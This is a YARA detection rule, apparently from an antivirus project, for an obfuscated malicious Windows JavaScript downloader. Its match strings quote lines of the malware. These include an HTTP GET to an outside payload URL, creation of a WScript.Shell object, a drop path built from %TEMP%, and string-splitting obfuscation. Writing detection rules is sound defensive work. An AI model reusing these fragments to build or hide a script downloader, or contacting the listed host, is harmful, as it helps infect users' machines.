rule sig_20160427_6ee1724d06b1b47f24b37a7a23863d41 {
  meta:
    description = "datamaliciousorder - file 20160427_6ee1724d06b1b47f24b37a7a23863d41.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "051ac290f0e2ed75505780dcd5a66e0bd5d2e7a086037bbc57ef1ff0d0f8cd36"

  strings:
    $s1  = "NvjziFzxxd[OsmitArgis](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function TfrrkJyidp() {return AgefiRvclb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"VCsEvAq" ascii
    $s3  = "function TfrrkJyidp() {return AgefiRvclb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"VCsEvAq" ascii
    $s4  = "function EoivwKilke(ZwyqaNagau, XwomrOmtdh){RwfixRbbwr = RwfixRbbwr * 1; return ZwyqaNagau - XwomrOmtdh;};" fullword ascii
    $s5  = "var AgefiRvclb = function UqwqpUkaha() {return HkegzKyozb[PykwxCcepc](\"WScript\"+\".Shell\");}(), RcmveTnhwq = 11;" fullword ascii
    $s6  = "var HkegzKyozb = this[\"WScript\"];" fullword ascii
    $s7  = "if (NvjziFzxxd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function AnfqeGqmlb(){return DoldtKejrr + \"\";};" fullword ascii
    $s9  = "function IfyvcBynwy() {return ((JfmscLoexa == true) && (JfmscLoexa == BbbpgPpgnj)) ? 1 : RwfixRbbwr;};" fullword ascii
    $s10 = "HlnrgYfrwu = true;" fullword ascii
    $s11 = "var DzuxyWvebb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "function EabszYaazc(){return PykwxCcepc;};" fullword ascii
    $s13 = "var HlnrgYfrwu = false;" fullword ascii
    $s14 = "var BbbpgPpgnj = false;" fullword ascii
    $s15 = "var JfmscLoexa = false;" fullword ascii
    $s16 = "return EoivwKilke(TnkymKrvmi, QlpzxLuctf);" fullword ascii
    $s17 = "BbbpgPpgnj = true; " fullword ascii
    $s18 = "function MgolxWkans()" fullword ascii
    $s19 = "function LpywoAzebx(){return 23;};" fullword ascii
    $s20 = "}while (IrwbwLcrra);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}